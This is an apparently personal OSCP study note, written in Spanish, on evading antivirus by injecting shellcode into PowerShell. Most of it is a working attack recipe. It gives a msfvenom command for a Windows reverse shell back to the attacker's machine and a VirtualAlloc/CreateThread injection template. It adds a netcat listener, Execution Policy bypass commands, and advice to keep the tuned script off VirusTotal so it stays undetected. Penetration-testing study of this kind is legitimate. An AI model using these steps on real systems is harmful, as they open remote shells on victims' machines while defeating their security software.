---
tipo: tecnica
fase: evasion
so: windows
tags: [oscp, tecnica, evasion, explotacion, windows]
fecha: 2026-10-05
---

# Evasion AV con PowerShell (Thread Injection)

> [!abstract] Qué es y cuándo usarla
> Ejecutar un payload **en memoria** dentro del propio `powershell.exe` (x86) para evadir el AV: se reservan bytes con `VirtualAlloc`, se escribe el shellcode y se lanza con `CreateThread`. Como es un **script (texto interpretado)**, es difícil de firmar y fácil de mutar. Úsala cuando un PE de msfvenom es detectado pero puedes ejecutar PowerShell en el target.

## Requisitos previos
- Ejecutar PowerShell (arquitectura que **coincida** con el payload → x86 payload = **Windows PowerShell (x86)**).
- Poder saltar la Execution Policy (per-user; salvo que esté por GPO).

## Pasos
1. Generar shellcode en formato reflection:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=443 -f psh-reflection
```
2. Pegarlo en la plantilla (sustituye `<place shellcode here>`):
```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

<place shellcode here>
```
3. Guardar como `bypass.ps1`, transferir al target.
4. Listener en Kali + ejecutar:
```bash
nc -lvnp 443
```
```powershell
# si salta la Execution Policy:
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser    # global per-user
powershell -ExecutionPolicy Bypass -File .\bypass.ps1                   # o solo para esta ejecución
.\bypass.ps1
```

| API / comando | Para qué |
|---|---|
| `VirtualAlloc` | Reservar memoria ejecutable |
| `CreateThread` | Ejecutar el shellcode en un hilo del proceso actual |
| `memset` | Escribir el shellcode en la memoria reservada |
| `-f psh-reflection` | Formato msfvenom con nombres de var/func **aleatorios** (evade firmas estáticas) |
| `Set-ExecutionPolicy ... -Scope CurrentUser` | Permitir scripts (per-user, sin admin) |
| `-ExecutionPolicy Bypass -File` | Saltar la policy solo en esa ejecución |

> [!warning] Detección / problemas
> - **Arquitectura**: payload x86 → PowerShell **x86**, o el shellcode no corre.
> - La **Execution Policy NO es seguridad** (per-user). Si está por **GPO**, busca otros vectores.
> - `psh-reflection` baja detección por strings, pero **ML/EDR** pueden analizar el comportamiento del script y alertar al SOC.
> - No subas el `bypass.ps1` afinado a VirusTotal (lo queman las ML cloud).

## Visto en
- Módulo: [[15 - Antivirus Evasion]]
- Relacionado: [[Shellter]]
- Máquinas: [[]]
